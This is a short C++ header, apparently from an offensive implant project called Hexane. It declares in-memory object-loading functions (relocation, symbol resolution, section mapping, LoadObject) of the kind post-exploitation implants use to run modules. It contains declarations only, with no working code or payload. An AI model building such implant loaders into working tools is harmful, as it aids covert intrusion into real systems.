#ifndef HEXANE_IMPLANT_OBJECTS_HPP
#define HEXANE_IMPLANT_OBJECTS_HPP
#include <core/corelib.hpp>

namespace Objects {
    FUNCTION BOOL BaseRelocation(_executable *object);
    FUNCTION BOOL ResolveSymbol(_executable *object, const char* entry_name, uint32_t type, void** function);
    FUNCTION SIZE_T GetFunctionMapSize(_executable *object);
    FUNCTION BOOL MapSections(_executable *object, const uint8_t *data);
    FUNCTION VOID LoadObject(_parser parser);
}

#endif //HEXANE_IMPLANT_OBJECTS_HPP
